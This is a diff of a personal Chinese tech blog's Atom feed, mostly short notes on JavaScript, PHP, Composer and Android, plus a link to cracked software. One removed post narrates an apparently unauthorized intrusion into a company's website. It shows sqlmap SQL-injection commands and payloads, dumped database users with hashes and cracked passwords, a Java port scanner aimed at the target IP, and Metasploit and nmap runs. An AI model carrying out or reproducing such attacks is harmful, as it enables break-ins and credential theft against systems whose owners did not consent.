@@ -4,7 +4,7 @@
   <title><![CDATA[K]]></title>
   <link href="http://mzkmzk.github.io/atom.xml" rel="self"/>
   <link href="http://mzkmzk.github.io/"/>
-  <updated>2015-09-09T16:41:24+08:00</updated>
+  <updated>2015-09-22T16:50:09+08:00</updated>
   <id>http://mzkmzk.github.io/</id>
   <author>
     <name><![CDATA[K]]></name>
@@ -12,6 +12,186 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[js 坑点]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/09/21/js_error/"/>
+    <updated>2015-09-21T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/09/21/js_error</id>
+    <content type="html"><![CDATA[<h1>未解决</h1>
+
+<p>莫名其妙.在div中设置onclick方法就能找该方法,在包含下的input下就找不到.</p>
+
+<pre><code>'&lt;div class="col-sm-1" onclick="delete_library()"&gt;'+
+        '&lt;input  onclick="delete_library()" class="btn btn-info" id="delete_library_'+new_library_num+'" name="delete_library" value="删除"   style="width:100%"  /&gt;'+    
+    '&lt;/div&gt;';
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[开发规范]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/09/21/develop_norm/"/>
+    <updated>2015-09-21T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/09/21/develop_norm</id>
+    <content type="html"><![CDATA[<h3>ALL</h3>
+
+<p>在函数名和变量名种一个_分割功能,描述一个功能的两个单词用驼峰</p>
+
+<p>包名 首字母大写</p>
+
+<h3>JS</h3>
+
+<h3>CSS</h3>
+
+<h3>HTML</h3>
+
+<ol>
+<li>在控件中,id绝对不能重复,要重复.宁可不设</li>
+</ol>
+
+
+<h3>Adnroid</h3>
+
+<h3>php</h3>
+
+<h3>iOS</h3>
+
+<h3>ERROR</h3>
+
+<ol>
+<li>类 方法 错误 参数;</li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[phpUnit 入门]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/09/16/phpUnit_start/"/>
+    <updated>2015-09-16T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/09/16/phpUnit_start</id>
+    <content type="html"><![CDATA[<h3>参考链接</h3>
+
+<p>高大上的API<a href="https://phpunit.de/manual/current/zh_cn/">https://phpunit.de/manual/current/zh_cn/</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[php Composer 入门]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/09/16/php-composer/"/>
+    <updated>2015-09-16T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/09/16/php-composer</id>
+    <content type="html"><![CDATA[<h3>安装</h3>
+
+<pre><code>curl -sS https://getcomposer.org/installer | php
+sudo mv ~/Learning/php/Composer/composer.phar  /usr/local/bin/composer
+composer //即可
+</code></pre>
+
+<h3>安装phpUnit</h3>
+
+<p>在项目下新建<code>composer.json</code>,配置号需要的安装包</p>
+
+<pre><code>{
+    "require-dev": {
+        "phpunit/phpunit-selenium": "&gt;=1.2"
+    }
+}
+</code></pre>
+
+<p>安装</p>
+
+<pre><code>cd 项目目录
+composer.phar install
+
+//一开始是这样的
+Loading composer repositories with package information
+Installing dependencies (including require-dev)
+Failed to decode response: zlib_decode(): data error
+Retrying with degraded mode, check https://getcomposer.org/doc/articles/troubleshooting.md#degraded-mode for more info
+
+//后面再等等好了
+</code></pre>
+
+<h3>设置全局Composer</h3>
+
+<pre><code>composer global [全局组件]
+</code></pre>
+
+<h3>使用Composer中Vendor命令</h3>
+
+<pre><code>PATH="/Users/maizhikun/.composer/vendor/bin/:${PATH}"
+</code></pre>
+
+<h3>参考链接</h3>
+
+<p>安装参考<a href="http://www.phpcomposer.com/">http://www.phpcomposer.com/</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[决策性错误]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/09/16/my_error/"/>
+    <updated>2015-09-16T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/09/16/my_error</id>
+    <content type="html"><![CDATA[<ol>
+<li>给别的部门表需要填写Excel时,一定要填写好规则.不然会把自己累死&hellip;</li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Android开发总结]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/09/10/android_summarization/"/>
+    <updated>2015-09-10T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/09/10/android_summarization</id>
+    <content type="html"><![CDATA[<ol>
+<li>命名规范时,要保增加/删除其他功能时命名不用改变</li>
+<li>模块化,一般大量调用后就不要轻易改变.作为一个基础.不然其他调用此模块的代码都需要改变</li>
+<li>不错的参考模块<a href="http://www.codeceo.com/article/android-code-style-guide.html">http://www.codeceo.com/article/android-code-style-guide.html</a></li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Android adb]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/09/10/android_adb_order/"/>
+    <updated>2015-09-10T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/09/10/android_adb_order</id>
+    <content type="html"><![CDATA[<ol>
+<li>adb device 显示连接的设备</li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[php_常见小问题]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/09/09/php_question/"/>
+    <updated>2015-09-09T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/09/09/php_question</id>
+    <content type="html"><![CDATA[<h3>0x00 php echo 返回JSON但莫名多了&amp;#65279</h3>
+
+<p>原因:调用的文件中存储UTF-8 BOM 把格式改为UTF-8即可</p>
+
+<p>js正则也可以去除此字符</p>
+
+<pre><code>//去除返回数据前后空白符
+function trim(str){
+str = str.replace(/^\s\s*/, ''),
+ws = /\s/,
+i = str.length;
+while (ws.test(str.charAt(--i)));
+return str.slice(0, i + 1);
+}
+</code></pre>
+
+<p>但是想把该代码转为JAVA的,但对正则不太了解.日后再说.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[AndroidStudio技巧]]></title>
@@ -77,7 +257,9 @@ error_log = /var/log/php_errors.log
     <link href="http://mzkmzk.github.io/blog/2015/09/06/mac_mysql_cnf/"/>
     <updated>2015-09-06T11:37:40+08:00</updated>
     <id>http://mzkmzk.github.io/blog/2015/09/06/mac_mysql_cnf</id>
-    <content type="html"><![CDATA[<h3>0x00 copy my.cnf</h3>
+    <content type="html"><![CDATA[<p>参考mysql系统设置<code>SHOW VARIABLES</code></p>
+
+<h3>0x00 copy my.cnf</h3>
 
 <p>Mac默认没有这个文件.用系统默认的配置</p>
 
@@ -265,8 +447,25 @@ id, name
 data-*
 src, for, type, href
 title, alt
-aria-*, role    
+aria-*, role
 </code></pre>
+
+<h3>零散属性收集</h3>
+
+<ol>
+<li><p>background:</p>
+
+<pre><code> background-color
+ background-position
+ background-size
+ background-repeat 
+ background-origin
+ background-clip
+ background-attachment
+ background-image :url()
+</code></pre></li>
+</ol>
+
 ]]></content>
   </entry>
   
@@ -278,109 +477,16 @@ aria-*, role
     <content type="html"><![CDATA[<!--more-->
 
 
+<h3>0x00 安装 &amp;&amp; 破解 &amp;&amp; 汉化</h3>
+
+<p><a href="http://www.woshipm.com/xiazai/58714.html">http://www.woshipm.com/xiazai/58714.html</a></p>
+
+<h3>Demo</h3>
+
 <p><a href="http://www.douban.com/group/topic/39697467/">http://www.douban.com/group/topic/39697467/</a>
 <a href="http://blog.sina.com.cn/s/blog_7256fe8f0101b29t.html">http://blog.sina.com.cn/s/blog_7256fe8f0101b29t.html</a></p>
 
 <p>侧滑和弹窗效果实现记录</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[HaploX Web Bug制作过程]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/07/27/Haplox_APP_start/"/>
-    <updated>2015-07-27T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/07/27/Haplox_APP_start</id>
-    <content type="html"><![CDATA[<h3>0x00 Web Bug</h3>
-
-<ol>
-<li>用户登录时间不对</li>
-<li>管理用户和用户列表是一样的- -?.</li>
-<li>数据库级联删除 - 目测是执行多个sql而非设置数据库表关系</li>
-<li>权限限制为空</li>
-<li><a href="http://192.168.0.20:8080/lab/backend-zh/patient/addPatient.php">http://192.168.0.20:8080/lab/backend-zh/patient/addPatient.php</a>必填UI错位</li>
-<li>添加病人时,性别为何要Unknow</li>
-<li>添加病人时显示错误:机构名称错误，无法找到有效编码！！！主诉疾病名称错误，无法找到有效编码！！！,不友好 又要全部重新填过,建议Ajax及时校验</li>
-<li>病人列表 选择排序时,下拉贴表超出去了</li>
-<li>建议新增病人时,机构名称为下拉列表,</li>
-<li>新增病人的时候啊.什么是机构分配
-编码,是新增机构时我填写的编码吗.</li>
-<li>第三次添加病人.显示错误:主诉疾病名称错误，无法找到有效编码！！！</li>
-<li>终于成功添加病人了&hellip;添加病人中的主诉疾病还是下拉列表比较好</li>
-<li>病人添加病历还得重新填姓名?????????????????????????id级联不行?</li>
-<li>疑问:新增病历时:能否重复提交同一种主诉疾病</li>
-<li>新增病历的病历图片居然是一个文本框?</li>
-<li>添加病历显示:病人/样本不存在！！！&hellip;.</li>
-<li>修改病人资料:必填项不可为空！！！但是星星只标了头三项不能为空</li>
-<li>新增病历要求病人名称不能为空,但是新增病人时病人名字可以为空</li>
-<li>修改病人资料时,全部资料写完了 但是还是显示必填项不能为空</li>
-<li>感觉web导航栏和左部重复</li>
-<li>新增DNA信息生成编码时为乱码:����-150727001和处理时间错位</li>
-<li>页面统一字符,能用中文都用中文,别中英参杂</li>
-<li><p>数据库多余字段</p>
-
-<pre><code>patient_medical_record表
-1. title
-2. detail
-3. major_disease
-</code></pre></li>
-</ol>
-
-
-<h3>0x00 APP构架思路</h3>
-
-<p>疑问:报告生成的根据属性</p>
-
-<h3>0X01 编写list_View页面思路</h3>
-
-<ol>
-<li>编写布局文件</li>
-<li>编写Bean 了解清楚显示属性</li>
-<li>编写Adapter</li>
-<li>编写Handler</li>
-<li>编写Thread</li>
-<li>编写Activity</li>
-</ol>
-
-
-<h3>0x02 APP图片地址</h3>
-
-<p>index</p>
-
-<p>病人管理<a href="https://www.iconfinder.com/icons/313530/aid_cure_medical_patient_surgery_surgical_icon#size=128">https://www.iconfinder.com/icons/313530/aid_cure_medical_patient_surgery_surgical_icon#size=128</a></p>
-
-<p>样本管理<a href="https://www.iconfinder.com/icons/227904/color_drip_dropper_sample_icon#size=128">https://www.iconfinder.com/icons/227904/color_drip_dropper_sample_icon#size=128</a></p>
-
-<p>DNA管理<a href="https://www.iconfinder.com/icons/368106/biology_dna_icon#size=128">https://www.iconfinder.com/icons/368106/biology_dna_icon#size=128</a></p>
-
-<p>DNA文库<a href="https://www.iconfinder.com/icons/278716/dna_genious_icon#size=128">https://www.iconfinder.com/icons/278716/dna_genious_icon#size=128</a></p>
-
-<p>上机管理<a href="https://www.iconfinder.com/icons/363302/computer_glasses_woman_icon#size=128">https://www.iconfinder.com/icons/363302/computer_glasses_woman_icon#size=128</a></p>
-
-<p>测序管理<a href="https://www.iconfinder.com/icons/391688/filter_list_order_outline_sequence_sort_sorting_icon#size=128">https://www.iconfinder.com/icons/391688/filter_list_order_outline_sequence_sort_sorting_icon#size=128</a></p>
-
-<h3>0x03 APP疑问</h3>
-
-<ol>
-<li>样本列表中病人和取样者的区别</li>
-<li>样本和DNA的关系</li>
-</ol>
-
-
-<h3>0x04 遗留问题</h3>
-
-<ol>
-<li><p>index中6个图片要制作成.9.png不然每个屏幕显示不一样.</p></li>
-<li><p>首页中轮播图有两个onclick时间不知道是干哈的- -. 发现2个是一样的 就删了一个</p></li>
-</ol>
-
-
-<h3>0x05 总结</h3>
-
-<ol>
-<li>命名 文件夹首字母大写</li>
-<li>命令 文件夹 功能跳转 以跳转为头,若镶嵌 则功能为头</li>
-</ol>
-
 ]]></content>
   </entry>
   
@@ -889,1102 +995,6 @@ let backwardsSTRING = String(reverse(s))
 <h3>0x01 教程下载地址</h3>
 
 <p><a href="https://community.rapid7.com/docs/DOC-2100">https://community.rapid7.com/docs/DOC-2100</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[sqlmap 渗透某集团]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/07/18/sqlmap_zhongxin.markdonw/"/>
-    <updated>2015-07-18T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/07/18/sqlmap_zhongxin.markdonw</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>0x00 找到盲注点</h3>
-
-<p>参考链接<a href="http://bluereader.org/article/59585524">http://bluereader.org/article/59585524</a></p>
-
-<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --dbs
-
-sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
----
-Parameter: fax_id (GET)
-Type: UNION query
-Title: MySQL UNION query (NULL) - 4 columns
-Payload: fax_id=1' UNION ALL SELECT NULL,CONCAT(0x71786a7a71,0x72514471566c4b56546f,0x71706a7871),NULL,NULL#
-
-Type: AND/OR time-based blind
-Title: MySQL &gt; 5.0.11 AND time-based blind (SELECT)
-Payload: fax_id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))dCsX) AND 'uYLq'='uYLq
----
-
-available databases [3]:                                                       
-[*] information_schema
-[*] mysql
-[*] mysql3235
-</code></pre>
-
-<h3>0x01 查看数据库表和数据</h3>
-
-<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --tables
-</code></pre>
-
-<p>就会得到数据库中的所有表,然后我随即抽了一个schedule表查看数据</p>
-
-<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --dump -T schedule
-</code></pre>
-
-<p>但是结果不如人意</p>
-
-<pre><code>[13:27:41] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
-
-Database: mysql3235
-Table: schedule
-[0 entries]
-+-------+---------+-----------+
-| TITLE | ENDTIME | STARTTIME |
-+-------+---------+-----------+
-+-------+---------+-----------+
-</code></pre>
-
-<h3>0x02 尝试爆破数据库密码</h3>
-
-<p>获取数据库用户</p>
-
-<pre><code> python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --users
-
-database management system users [5]:                                          
-[*] ''@'localhost'
-[*] 'cubetech'@'localhost'
-[*] 'debugger'@'localhost'
-[*] 'root'@'127.0.0.1'
-[*] 'root'@'localhost'
-</code></pre>
-
-<p>获取数据库密码</p>
-
-<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --users --passwords
-
-database management system users password hashes:                              
-[*] cubetech [1]:
-password hash: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
-clear-text password: 123456
-[*] debugger [1]:
-password hash: *6D45DF82DF6169868F43DD422AB3229D376BD1BE
-clear-text password: debugger
-[*] root [1]:
-password hash: *1532B21FE550E115F113DAA9A26D0EEEEF8DEDC7
-</code></pre>
-
-<h3>0x03 探索Mysql端口</h3>
-
-<p>知道了数据库用户名和端口后 我就尝试远程链接数据库了.ip很容易得到. 应该是服务器本身 .这样的服务器管理员应该是不会做服务器和数据库分离的 .</p>
-
-<p>尝试了mysql的3306端口 失败!</p>
-
-<p>写了个java扫描哪些端口开启&hellip;</p>
-
-<pre><code>import java.net.Socket;
-
-import java.util.ArrayList;
-import java.util.List;
-
-
-public class Check_Open_Port {
-public static void main(String args[]) {
-    final List&lt;Integer&gt; li = new ArrayList&lt;Integer&gt;();
-    for (int i = 0; i &lt;= 65535; i++) {
-        li.add(i);
-    }
-
-    for (int i = 0; i &lt;= 100; i++) {
-        new Thread() {
-            public void run() {
-                while (li.size() != 0) {
-                    int li_get = 0;
-                    int num = (int) Math.floor(Math.random()* (li.size()));
-                    try {
-                        li_get = li.get(num);
-                        int num_remove_check =li.indexOf(li_get);
-                        if(num_remove_check!=-1)
-                        li.remove(num_remove_check);
-                        Socket client = new Socket("122.233.243.***",
-                                li_get);
-                        System.out.println("端口 : " + li_get + "已开放");
-                        client.close();
-                    } catch (Exception e) {
-                        System.out.println("端口 : " + li_get + "未开放");
-                    }
-                }
-            }
-        }.start();
-    }
-    //检测ip有无被封锁 和当前集合个数
-    new Thread() {
-        public void run() {
-            while (li.size() != 0) {
-                try {
-                    Socket client = new Socket("122.233.243.***", 80);
-                    System.out.println("端口 : " + 80 + "已开放");
-                    client.close();
-
-                } catch (Exception e) {
-                    System.out.println("端口 : " + 80 + "未开放");
-                }
-                System.out.println("当前集合个数 : "+li.size());
-                try {
-                    join(50000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-        }
-    }.start();
-}
-}
-</code></pre>
-
-<p>扫了好久..结果发现没有扫到 原因有两个</p>
-
-<ol>
-<li><p>其实扫到了 不过控制台信息太多了 把扫到的端口顶掉了 我应该把输出写到一个log里</p></li>
-<li><p>就是并发线程没控制好.一个线程remove list数据的时候,另外一个线程已经remove了.然后数据在List的位置就会改变,导致漏了好多端口.我应该做线程锁,或者写map的 检查过就把value设成true.</p></li>
-</ol>
-
-
-<p>好了扫描端口其实只是一个尝试,并没有太多技术含量.我决定要从Tomcat入手.尝试用metasploit破解Tomcat</p>
-
-<h3>0x04 metasploit 入侵Tomcat</h3>
-
-<p>终端输入</p>
-
-<pre><code>msfconsole
-</code></pre>
-
-<p>设置入侵Tomcat</p>
-
-<pre><code>msf &gt; use auxiliary/scanner/http/tomcat_mgr_login
-msf auxiliary(tomcat_mgr_login) &gt; set RHoSTS 122.233.243.***
-RHoSTS =&gt; 122.233.243.***
-msf auxiliary(tomcat_mgr_login) &gt; set RPORT 80
-RPORT =&gt; 80
-msf auxiliary(tomcat_mgr_login) &gt; run
-</code></pre>
-
-<p>结果并没有破解出密码- -.</p>
-
-<p>参考文章<a href="http://www.rising.com.cn/newsletter/news/2013-03-01/13256.html">http://www.rising.com.cn/newsletter/news/2013-03-01/13256.html</a></p>
-
-<h3>0x05 再次尝试利用 metasploit 检测出 数据库端口</h3>
-
-<pre><code>msf &gt; nmap -Pn -sV 122.233.243.***
-
-Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-19 23:05 CST
-
-Nmap scan report for 122.233.243.***
-Host is up (0.13s latency).
-Not shown: 991 filtered ports
-
-PORT      STATE  SERVICE           VERSION
-80/tcp    open   http              Apache Tomcat/Coyote JSP engine 1.1
-135/tcp   closed msrpc
-139/tcp   closed netbios-ssn
-593/tcp   closed http-rpc-epmap
-3389/tcp  open   ms-wbt-server     Microsoft Terminal Service
-4444/tcp  closed krb524
-6059/tcp  open   tcpwrapped
-10000/tcp open   snet-sensor-mgmt?
-10010/tcp open   rxapi?
-Service Info: OS: Windows
-</code></pre>
-
-<p>好像并没有我们想得到的</p>
-
-<h3>0x06 穷途末路的我尝试了下mysql扫描</h3>
-
-<pre><code>msf auxiliary(tomcat_mgr_login) &gt; use auxiliary/scanner/mysql/mysql_login
-msf auxiliary(mysql_login) &gt; set RHOSTS 122.233.243.***
-RHOSTS =&gt; 122.233.243.***
-msf auxiliary(mysql_login) &gt; run
-
-[-] 122.233.243.***:3306 MYSQL - Unable to connect: The connection timed out (122.233.243.***:3306).
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-</code></pre>
-
-<p>其实傻子也知道不可以- -因为看了下<code>info</code>扫的端口是3306 怎么可能可以&hellip;.</p>
-
-<p>参考链接<a href="http://www.bubuko.com/infodetail-343797.html">http://www.bubuko.com/infodetail-343797.html</a></p>
-
-<h3>0x07 利用sql-shell查端口</h3>
-
-<pre><code>show variables like 'port';
-
-or
-
-select * from global_variables where VARIABLE_NAME ='PORT';
-</code></pre>
-
-<p>上面2个命令都可以查询端口,但是global_variables表属于临时表,只在当前连接下显示,所以无法利用 但是还是想通过insert 插入到一个表中</p>
-
-<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --sql-shell  "SELECT  'global_variables'" -v 5 
-
-insert into hr_event(name) select VARIABLE_NAME from information_schema.global_variables where VARIABLE_NAME ='PORT';
-[02:46:34] [WARNING] execution of custom SQL queries is only available when stacked queries are supported
-</code></pre>
-
-<p>通过sqlmap执行的sql-shell只能执行简单的查询,所以此法无效</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[网站 seo的开始]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/07/16/seo_start/"/>
-    <updated>2015-07-16T21:28:46+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/07/16/seo_start</id>
-    <content type="html"><![CDATA[<p>网站的seo 一开始主要给百度和谷歌提交网站地图和优化代码</p>
-
-<h3>0x00 验证网址</h3>
-
-<p>首先要先验证网址是你的- -.</p>
-
-<p>百度站长地址:<a href="http://zhanzhang.baidu.com/">http://zhanzhang.baidu.com/</a></p>
-
-<p>谷歌站长地址<a href="https://www.google.com/webmasters/tools/">https://www.google.com/webmasters/tools/</a></p>
-
-<h3>0x01 提交网址</h3>
-
-<p>跟目录下编写<code>robots.txt</code>文件</p>
-
-<p>eg:</p>
-
-<pre><code>User-agent: *
-Disallow: 
-
-Sitemap: http://mzkmzk.github.io/sitemap.xml 
-</code></pre>
-
-<p><code>http://mzkmzk.github.io/sitemap.xml</code>则为我的网站地图</p>
-
-<p>生成网址<a href="https://www.xml-sitemaps.com/">https://www.xml-sitemaps.com/</a></p>
-
-<p>然后再百度和站长工具提交robots.txt和sitemap.xml即可</p>
-
-<h3>后续建议</h3>
-
-<p>SEO 网站的质量最为关键 其次,可以CSS和JS合成减少网络请求也有用,最好建一个百度统计,时刻留意网站访问趋势。</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[octorpess添加评论功能]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/07/16/comments_octopress/"/>
-    <updated>2015-07-16T21:28:46+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/07/16/comments_octopress</id>
-    <content type="html"><![CDATA[<p>使用的是<code>多说评论系统</code></p>
-
-<p>注册多说<a href="http://duoshuo.com/">http://duoshuo.com/</a></p>
-
-<h3>0x00 系统设置修改</h3>
-
-<p>在<code>_config.xml</code>文件最下方添加 yurename为注册多说时的个性域名二级域名,例如mzkmzk.duoshuo.com yourname则为mzkmzk</p>
-
-<pre><code># duoshuo comments
-duoshuo_comments: true
-duoshuo_short_name: yourname
-</code></pre>
-
-<h3>0x01 修改页面</h3>
-
-<p>在 <code>source/_layouts/post.html</code> 最下方添加的 <code>disqus</code>代码</p>
-
-<pre><code>\{\% if site.duoshuo_short_name and site.duoshuo_comments == true and page.comments == true \%\}
-&lt;section&gt;
-&lt;h1&gt;Comments&lt;/h1&gt;
-&lt;div id="comments" aria-live="polite"&gt;\{\% include post/duoshuo.html \%\}&lt;/div&gt;
- &lt;/section&gt;
- \{\% endif \%\}
-</code></pre>
-
-<p>如果你希望一些单独的页面下方也放置评论功能，譬如 <code>rake new_page["xxx"]</code> 产生的页面也能评论，那么请在 <code>source/_layouts/page.html</code> 中也做如上的修改。</p>
-
-<h3>0x02 创建模块代码</h3>
-
-<p>创建文件<code>source/_includes/post/duoshuo.html</code></p>
-
-<p>代码如下</p>
-
-<pre><code>&lt;!-- 多说评论框 start --&gt;
-&lt;div class="ds-thread" data-thread-key="\{\% if site.titlecase \%\}\{\{ page.title | titlecase \}\}\{\% else \%\}\{\{ page.title \}\}\{\% endif \%\}" data-title="\{\% if site.titlecase \%\}\{\{ page.title | titlecase \}\}\{\% else \%\}\{\{ page.title \}\}\{\% endif \%\}" data-url="\{\% if site.url \%\}\{\{ page.url | url \}\}\{\% else \%\}\{\{ page.url \}\}\{\% endif \%\}"&gt;&lt;/div&gt;
-&lt;!-- 多说评论框 end --&gt;
-&lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt;
-&lt;script type="text/javascript"&gt;
-var duoshuoQuery = {short_name:"mzkmzk"};
-(function() {
-    var ds = document.createElement('script');
-    ds.type = 'text/javascript';ds.async = true;
-    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-    ds.charset = 'UTF-8';
-    (document.getElementsByTagName('head')[0] 
-     || document.getElementsByTagName('body')[0]).appendChild(ds);
-})();
-&lt;/script&gt;
-&lt;!-- 多说公共JS代码 end --&gt;
-</code></pre>
-
-<h3>0x03 在文章标签处添加评论快捷键</h3>
-
-<p>就是在文章左侧添加一个按钮 点一下即可到评论模块</p>
-
-<p>文件<code>_includes/article.html</code></p>
-
-<pre><code>        \{\% if site.disqus_short_name and page.comments != false and post.comments != false and site.disqus_show_comment_count == true \%\}
-     | &lt;a href="\{\% if index \%\}\{\{ root_url \}\}\{\{ post.url \}\}\{\% endif \%\}#disqus_thread"&gt;Comments&lt;/a&gt;
-    \{\% endif \%\}
-</code></pre>
-
-<p>下方添加</p>
-
-<pre><code>   \{\% if site.duoshuo_short_name and page.comments != false and post.comments != false and site.duoshuo_comments == true \%\}
-      | &lt;a href="\{\% if index \%\}\{\{ root_url \}\}\{\{ post.url \}\}\{\% endif \%\}#comments"&gt;Comments&lt;/a&gt;
-     \{\% endif \%\}
-</code></pre>
-
-<h3>参考链接</h3>
-
-<p><a href="http://havee.me/internet/2013-02/add-duoshuo-commemt-system-into-octopress.html">http://havee.me/internet/2013-02/add-duoshuo-commemt-system-into-octopress.html</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[个人简历]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/07/16/adoube_me.markdwon/"/>
-    <updated>2015-07-16T21:28:46+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/07/16/adoube_me.markdwon</id>
-    <content type="html"><![CDATA[<p>毕业于天津大学仁爱学院,深圳和东莞地区求职,java、android、web方向。大学主要参加比赛与接外包项目,曾荣获华北五省计算机大赛一等奖、蓝桥杯软件大赛全国三等奖和服务外包大赛二等奖。外包项目方向主要为Web响应式设计与就业系统设计。个人博客<a href="http://mzkmzk.github.io">http://mzkmzk.github.io</a>。项目视频展示<a href="http://i.youku.com/404MZK">http://i.youku.com/404MZK</a></p>
-
-<p>个人简历</p>
-
-<p><img src="http://mzkmzk.github.io/images/blog/2015-07-16-01.jpg" alt="简历-1" />
-<img src="http://mzkmzk.github.io/images/blog/2015-07-16-02.jpg" alt="简历-2" />
-<img src="http://mzkmzk.github.io/images/blog/2015-07-16-03.jpg" alt="简历-3" /></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[修改octopress导航栏]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/07/13/update_slash/"/>
-    <updated>2015-07-13T21:28:46+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/07/13/update_slash</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<p>本人想做一个类似本博客中 导航栏的这个下拉选项效果</p>
-
-<h3>0x00 添加下拉框</h3>
-
-<p>导航栏页面 <code>/source/_include/header.html</code></p>
-
-<p> 在h1标签下添加下拉框</p>
-
-<pre><code>    &lt;nav id="K_select"&gt;
-    &lt;div class="alignleft menu"&gt;
-        &lt;a class="button"&gt;Category&lt;/a&gt;
-        &lt;div class="container"&gt;\{\% include navigation.html %\}\&lt;/div&gt;
-    &lt;/div&gt;
-    &lt;div class="alignright search"&gt;
-        &lt;a class="button"&gt;&lt;/a&gt;
-        &lt;div class="container"&gt;
-            &lt;form action="\{\{\ site.simple_search \}\}\" method="get"&gt;
-                &lt;input type="text" name="q" results="0"&gt;
-                &lt;input type="hidden" name="q" value="site:\{\{\ site.url | shorthand_url \}\}\"&gt;
-            &lt;/form&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    &lt;/nav&gt;
-</code></pre>
-
-<h3>0x01 设置相关css</h3>
-
-<p>css<code>/source/styleshets/screen.css</code></p>
-
-<pre><code>#K_select
- {
-display: block
-}
-
-#K_select a
-{
-display: block
-}
-
-#K_select .button
-{
-cursor: pointer
-}
-
-#K_select .container
-{
-display: none
-}
-
-#K_select .menu
-{
-position: relative;
-width: 150px;
-margin-left:175px;
-}
-
-#K_select .menu .button
-{
-background: #f2f2f2;
-border: 1px solid #ddd;
-color: #999;
-padding: 0 60px 0 10px;
-position: relative;
--webkit-border-radius: 5px;
--moz-border-radius: 5px;
--ms-border-radius: 5px;
--o-border-radius: 5px;
-border-radius: 5px
-}
-
-#K_select .menu .button:hover
-{
-color: #999
-}
-
-#K_select .menu .button.on
-{
-color: #666;
--webkit-border-radius: 5px 5px 5px 0;
--moz-border-radius: 5px 5px 5px 0;
--ms-border-radius: 5px 5px 5px 0;
--o-border-radius: 5px 5px 5px 0;
-border-radius: 5px 5px 5px 0
-}
-
-#K_select .menu .button.on:before
-{
-content: "\f077"
-}
-
-#K_select .menu .button:before
-{
-content: "\f078";
-color: #ddd;
-font: 16px FontAwesome;
-line-height: 30px;
-position: absolute;
-top: 0;
-right: 40px
-}
-
-#K_select .menu .container
-{
-background: #f2f2f2;
-border: 1px solid #ddd;
-border-top: none;
-position: absolute;
-top: 31px;
